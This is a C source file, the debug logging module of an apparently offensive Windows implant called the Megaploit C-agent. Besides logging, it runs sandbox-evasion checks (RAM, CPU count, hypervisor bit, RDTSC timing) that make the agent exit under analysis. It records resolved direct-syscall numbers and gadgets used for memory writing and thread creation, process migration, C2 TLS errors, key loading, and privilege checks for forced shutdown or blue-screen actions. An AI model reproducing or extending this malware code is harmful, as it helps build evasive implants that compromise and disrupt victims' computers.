/*
 * client/debug/agent_debug.c  –  Megaploit C-agent runtime debugger
 * ==================================================================
 * Only compiled when AGENT_DEBUG is defined (-DAGENT_DEBUG / make DBG=1).
 * In release builds this entire translation unit is excluded by the Makefile
 * and the macro stubs in agent_debug.h produce zero code.
 */

#ifdef AGENT_DEBUG

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

#include "agent_debug.h"
#include "../evasion/syscall.h"    /* sc_get_ssn, sc_get_gadget, SC_COUNT etc. */
#include "../core/ntcalls.h"       /* RtlAdjustPrivilege etc. for NULL checks   */

/* ── Internal state ──────────────────────────────────────────────────────── */
static FILE   *g_log      = NULL;
static BOOL    g_init_done = FALSE;
static CRITICAL_SECTION g_cs;       /* serialise concurrent thread writes       */

#define LOG_PATH  "C:\\Windows\\Temp\\megaploit_agent_debug.log"
#define ODS_PFX   "[MAGENT] "

/* ── Severity label helper ───────────────────────────────────────────────── */
static const char *_sev_label(int sev)
{
    switch (sev) {
        case DBG_OK:   return "OK  ";
        case DBG_WARN: return "WARN";
        case DBG_ERR:  return "ERR ";
        default:       return "INFO";
    }
}

/* ── UTC timestamp helper ────────────────────────────────────────────────── */
static void _fmt_ts(char *buf, int bufsz)
{
    SYSTEMTIME st;
    GetSystemTime(&st);
    _snprintf(buf, bufsz, "%02u:%02u:%02u.%03u",
              st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}

/* ── Raw write (already inside CS) ──────────────────────────────────────── */
static void _write_line(const char *subsys, int sev, const char *msg)
{
    char ts[16];
    _fmt_ts(ts, sizeof(ts));

    char line[1024];
    _snprintf(line, sizeof(line), "[%s | %s | %s] %s\n",
              ts, subsys, _sev_label(sev), msg);

    /* 1 — log file */
    if (g_log) {
        fputs(line, g_log);
        fflush(g_log);
    }

    /* 2 — debugger (OutputDebugStringA) */
    char ods[1100];
    _snprintf(ods, sizeof(ods), "%s%s", ODS_PFX, line);
    OutputDebugStringA(ods);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Public API implementations
 * ═══════════════════════════════════════════════════════════════════════════ */

void dbg_init(void)
{
    if (g_init_done) return;
    g_init_done = TRUE;

    InitializeCriticalSection(&g_cs);

    g_log = fopen(LOG_PATH, "a");  /* append — preserve previous sessions */

    /* session header */
    char sep[80];
    memset(sep, '=', 72); sep[72] = '\0';

    if (g_log) {
        fprintf(g_log, "\n%s\n", sep);
        fprintf(g_log, "  Megaploit C-agent debug session started\n");
        SYSTEMTIME st; GetSystemTime(&st);
        fprintf(g_log, "  UTC: %04u-%02u-%02u %02u:%02u:%02u\n",
                st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        /* PID */
        fprintf(g_log, "  PID: %lu\n", GetCurrentProcessId());
        fprintf(g_log, "%s\n\n", sep);
        fflush(g_log);
    }

    char ods[128];
    _snprintf(ods, sizeof(ods), "%s=== NEW SESSION PID=%lu ===\n",
              ODS_PFX, GetCurrentProcessId());
    OutputDebugStringA(ods);
}

/* ── dbg_log ─────────────────────────────────────────────────────────────── */
void dbg_log(const char *subsys, int sev, const char *fmt, ...)
{
    char msg[512];
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf(msg, sizeof(msg) - 1, fmt, ap);
    va_end(ap);
    msg[sizeof(msg) - 1] = '\0';

    EnterCriticalSection(&g_cs);
    _write_line(subsys, sev, msg);
    LeaveCriticalSection(&g_cs);
}

/* ── dbg_hex ─────────────────────────────────────────────────────────────── */
void dbg_hex(const char *subsys, int sev, const char *label,
             const BYTE *buf, DWORD len, DWORD max_bytes)
{
    if (!buf || len == 0) {
        dbg_log(subsys, sev, "%s: <null/empty>", label);
        return;
    }
    DWORD show = (len < max_bytes) ? len : max_bytes;

    /* Each byte = "XX " (3 chars), plus label + ellipsis + NUL */
    char hex[512];
    int pos = 0;
    pos += _snprintf(hex + pos, sizeof(hex) - pos, "%s[%lu]: ", label, len);
    for (DWORD i = 0; i < show && pos < (int)sizeof(hex) - 4; i++)
        pos += _snprintf(hex + pos, sizeof(hex) - pos, "%02X ", buf[i]);
    if (len > max_bytes && pos < (int)sizeof(hex) - 4)
        pos += _snprintf(hex + pos, sizeof(hex) - pos, "...");
    hex[sizeof(hex) - 1] = '\0';

    dbg_log(subsys, sev, "%s", hex);
}

/* ── dbg_ntcalls ─────────────────────────────────────────────────────────── */
/*
 * ntcalls_load() return codes:
 *   0xFF = all four resolved
 *   0x00 = ntdll not found
 *   bits 0-3 = individual missing exports
 *
 * ntcalls_verify() return codes:
 *   0x00 = all OK
 *   bits 0-3 = NULL pointers
 *   bit  4   = RtlAdjustPrivilege call failed (privilege denied)
 */
void dbg_ntcalls(DWORD load_rc, DWORD verify_rc)
{
    /* ── load result ── */
    if (load_rc == 0xFF) {
        dbg_log(DBG_SS_NTCALL, DBG_OK,
                "ntcalls_load() = 0xFF — all four exports resolved");
    } else if (load_rc == 0x00) {
        dbg_log(DBG_SS_NTCALL, DBG_ERR,
                "ntcalls_load() = 0x00 — ntdll.dll NOT FOUND in PEB");
    } else {
        dbg_log(DBG_SS_NTCALL, DBG_WARN,
                "ntcalls_load() = 0x%02lX — partial resolve (missing exports below)", load_rc);
        if (load_rc & 0x01)
            dbg_log(DBG_SS_NTCALL, DBG_WARN,
                    "  bit0 (0x01): RtlAdjustPrivilege    NOT exported by ntdll");
        if (load_rc & 0x02)
            dbg_log(DBG_SS_NTCALL, DBG_WARN,
                    "  bit1 (0x02): NtShutdownSystem      NOT exported by ntdll");
        if (load_rc & 0x04)
            dbg_log(DBG_SS_NTCALL, DBG_WARN,
                    "  bit2 (0x04): NtSetSystemPowerState NOT exported by ntdll");
        if (load_rc & 0x08)
            dbg_log(DBG_SS_NTCALL, DBG_WARN,
                    "  bit3 (0x08): NtRaiseHardError      NOT exported by ntdll");
    }

    /* ── verify result ── */
    if (verify_rc == 0x00) {
        dbg_log(DBG_SS_NTCALL, DBG_OK,
                "ntcalls_verify() = 0x00 — all pointers valid, SeShutdownPrivilege acquired");
    } else {
        dbg_log(DBG_SS_NTCALL, (verify_rc & 0x0F) ? DBG_ERR : DBG_WARN,
                "ntcalls_verify() = 0x%02lX — failures flagged below", verify_rc);
        if (verify_rc & 0x01)
            dbg_log(DBG_SS_NTCALL, DBG_ERR,
                    "  bit0 (0x01): RtlAdjustPrivilege    is NULL");
        if (verify_rc & 0x02)
            dbg_log(DBG_SS_NTCALL, DBG_ERR,
                    "  bit1 (0x02): NtShutdownSystem      is NULL");
        if (verify_rc & 0x04)
            dbg_log(DBG_SS_NTCALL, DBG_ERR,
                    "  bit2 (0x04): NtSetSystemPowerState is NULL");
        if (verify_rc & 0x08)
            dbg_log(DBG_SS_NTCALL, DBG_ERR,
                    "  bit3 (0x08): NtRaiseHardError      is NULL");
        if (verify_rc & 0x10)
            dbg_log(DBG_SS_NTCALL, DBG_WARN,
                    "  bit4 (0x10): RtlAdjustPrivilege() returned non-SUCCESS "
                    "— SeShutdownPrivilege DENIED (forceOff/blueScreen will fail)");
    }
}

/* ── dbg_scall ───────────────────────────────────────────────────────────── */
static const char *_sc_names[] = {
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtClose",
    "NtReadVirtualMemory",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtOpenFile",
    "NtDelayExecution",
};

void dbg_scall(void)
{
    const BYTE *gadget      = sc_get_gadget();
    const BYTE *gadget_int2e = sc_get_int2e_gadget();

    dbg_log(DBG_SS_SCALL, DBG_INFO,
            "sc_init gadget:       syscall;ret  @ 0x%p", (void *)gadget);
    dbg_log(DBG_SS_SCALL, DBG_INFO,
            "sc_init gadget:       int 2e;ret   @ 0x%p", (void *)gadget_int2e);

    int n = (int)(sizeof(_sc_names) / sizeof(_sc_names[0]));
    for (int i = 0; i < n; i++) {
        DWORD ssn = sc_get_ssn((SC_ID)i);
        if (ssn == 0xFFFFFFFF)
            dbg_log(DBG_SS_SCALL, DBG_ERR,
                    "  slot[%2d] %-30s: UNRESOLVED", i, _sc_names[i]);
        else
            dbg_log(DBG_SS_SCALL, DBG_OK,
                    "  slot[%2d] %-30s: SSN=0x%04lX", i, _sc_names[i], ssn);
    }
}

/* ── dbg_process ─────────────────────────────────────────────────────────── */
void dbg_process(void)
{
    DWORD  pid = GetCurrentProcessId();
    char   image[MAX_PATH] = {0};
    char   cwd[MAX_PATH]   = {0};

    GetModuleFileNameA(NULL, image, sizeof(image) - 1);
    GetCurrentDirectoryA(sizeof(cwd) - 1, cwd);

    dbg_log(DBG_SS_INIT, DBG_INFO, "PID           : %lu", pid);
    dbg_log(DBG_SS_INIT, DBG_INFO, "Image path    : %s", image[0] ? image : "(empty)");
    dbg_log(DBG_SS_INIT, DBG_INFO, "CWD           : %s", cwd[0]   ? cwd   : "(empty)");

    /* Integrity level via GetTokenInformation */
    HANDLE hTok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        DWORD  needed = 0;
        GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &needed);
        if (needed > 0 && needed <= 1024) {
            BYTE  buf[1024] = {0};
            if (GetTokenInformation(hTok, TokenIntegrityLevel, buf, needed, &needed)) {
                TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)buf;
                DWORD rid = *GetSidSubAuthority(tml->Label.Sid,
                              *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
                const char *lvl =
                    (rid >= 0x4000) ? "System" :
                    (rid >= 0x3000) ? "High"   :
                    (rid >= 0x2000) ? "Medium" : "Low";
                dbg_log(DBG_SS_INIT, DBG_INFO,
                        "Integrity     : %s (RID=0x%04lX)", lvl, rid);
            }
        }
        CloseHandle(hTok);
    }

    /* Username */
    char user[128] = {0};
    char domain[128] = {0};
    DWORD  ulen = sizeof(user) - 1;
    DWORD  dlen = sizeof(domain) - 1;
    HANDLE hTok2 = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok2)) {
        DWORD needed2 = 0;
        GetTokenInformation(hTok2, TokenUser, NULL, 0, &needed2);
        if (needed2 > 0 && needed2 <= 1024) {
            BYTE buf2[1024] = {0};
            if (GetTokenInformation(hTok2, TokenUser, buf2, needed2, &needed2)) {
                TOKEN_USER *tu = (TOKEN_USER *)buf2;
                SID_NAME_USE use;
                LookupAccountSidA(NULL, tu->User.Sid,
                                  user, &ulen, domain, &dlen, &use);
                dbg_log(DBG_SS_INIT, DBG_INFO,
                        "User          : %s\\%s", domain, user);
            }
        }
        CloseHandle(hTok2);
    }

    /*
     * OS version via RtlGetVersion (kernel32-forwarded to ntdll) — avoids
     * touching PEB reserved fields which vary by MinGW SDK version.
     * Fall back to VerifyVersionInfoA if the function pointer can't be found.
     */
    typedef LONG (WINAPI *RtlGetVersion_t)(OSVERSIONINFOEXW *);
    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)(void *)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (pRtlGetVersion) {
        OSVERSIONINFOEXW ov = {0};
        ov.dwOSVersionInfoSize = sizeof(ov);
        if (pRtlGetVersion(&ov) == 0)
            dbg_log(DBG_SS_INIT, DBG_INFO,
                    "OS build      : %lu.%lu.%lu",
                    ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);
    }
}

/* ── dbg_sandbox ─────────────────────────────────────────────────────────── */
void dbg_sandbox(BOOL sandbox_result)
{
    dbg_log(DBG_SS_SANDBOX, sandbox_result ? DBG_WARN : DBG_OK,
            "sandbox_check() = %s",
            sandbox_result ? "TRUE  (sandbox detected — agent will exit)"
                           : "FALSE (clean environment)");

    /* Physical RAM */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        DWORD gb = (DWORD)(ms.ullTotalPhys / (1024*1024*1024));
        dbg_log(DBG_SS_SANDBOX, (gb < 4) ? DBG_WARN : DBG_INFO,
                "  RAM          : %lu GB (%s)",
                gb, (gb < 4) ? "< 4 GB — sandbox heuristic triggers" : "OK");
    }

    /* CPU count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    dbg_log(DBG_SS_SANDBOX,
            (si.dwNumberOfProcessors < 2) ? DBG_WARN : DBG_INFO,
            "  CPUs         : %lu (%s)",
            si.dwNumberOfProcessors,
            (si.dwNumberOfProcessors < 2) ? "< 2 — sandbox heuristic triggers" : "OK");

    /* Hypervisor bit (CPUID leaf 1 bit 31 of ECX) */
    int cpuid_buf[4] = {0};
#if defined(__GNUC__) || defined(__clang__)
    __asm__ __volatile__(
        "cpuid"
        : "=a"(cpuid_buf[0]), "=b"(cpuid_buf[1]),
          "=c"(cpuid_buf[2]), "=d"(cpuid_buf[3])
        : "a"(1)
    );
#elif defined(_MSC_VER)
    __cpuid(cpuid_buf, 1);
#endif
    int hv = (cpuid_buf[2] >> 31) & 1;
    dbg_log(DBG_SS_SANDBOX, hv ? DBG_WARN : DBG_INFO,
            "  Hypervisor   : %s", hv ? "YES (bit31 ECX set)" : "NO");

    /* RDTSC delta */
    DWORD lo1, hi1, lo2, hi2;
    __asm__ __volatile__("cpuid; rdtsc" : "=a"(lo1), "=d"(hi1) :: "rbx","rcx");
    __asm__ __volatile__("rdtsc"        : "=a"(lo2), "=d"(hi2));
    DWORD64 t1 = ((DWORD64)hi1 << 32) | lo1;
    DWORD64 t2 = ((DWORD64)hi2 << 32) | lo2;
    DWORD64 delta = t2 - t1;
    dbg_log(DBG_SS_SANDBOX, (delta > 1000000) ? DBG_WARN : DBG_INFO,
            "  RDTSC delta  : %llu cycles (%s)",
            delta, (delta > 1000000) ? "> 1M — VM/hook overhead detected" : "OK");
}

/* ── dbg_tls ─────────────────────────────────────────────────────────────── */
void dbg_tls(BOOL connect_ok, int last_err)
{
    const char *err_str;
    switch (last_err) {
        case 0:  err_str = "TLS_ERR_NONE (success)";          break;
        case 1:  err_str = "TLS_ERR_SOCKET (connection lost)";break;
        case 2:  err_str = "TLS_ERR_TIMEOUT (SO_RCVTIMEO)";   break;
        case 3:  err_str = "TLS_ERR_CRYPTO (GCM tag/OOM)";    break;
        case 4:  err_str = "TLS_ERR_REPLAY (seq# not incr.)"; break;
        case 5:  err_str = "TLS_ERR_PROTO (bad frame)";       break;
        default: err_str = "UNKNOWN";                          break;
    }
    dbg_log(DBG_SS_TLS,
            connect_ok ? DBG_OK : DBG_ERR,
            "tls_connect() = %s  lastErr=%d (%s)",
            connect_ok ? "TRUE" : "FALSE", last_err, err_str);
}

/* ── dbg_migrate ─────────────────────────────────────────────────────────── */
void dbg_migrate(DWORD target_pid, const char *target_path, BOOL ok)
{
    dbg_log(DBG_SS_MIGRATE,
            ok ? DBG_OK : DBG_ERR,
            "auto_migrate() pid=%lu path='%s' result=%s",
            target_pid,
            target_path ? target_path : "(null)",
            ok ? "SUCCESS" : "FAILED");
}

/* ── dbg_key ─────────────────────────────────────────────────────────────── */
void dbg_key(const char *path, BOOL ok)
{
    dbg_log(DBG_SS_KEY,
            ok ? DBG_OK : DBG_ERR,
            "load_secret_key('%s') = %s",
            path ? path : "(null)",
            ok ? "OK (32 bytes decoded)" : "FAILED (missing/corrupt/bad hex)");
}

/* ── dbg_flush / dbg_close ───────────────────────────────────────────────── */
void dbg_flush(void)
{
    if (g_log) fflush(g_log);
}

void dbg_close(void)
{
    if (g_log) { fflush(g_log); fclose(g_log); g_log = NULL; }
}

#endif /* AGENT_DEBUG */
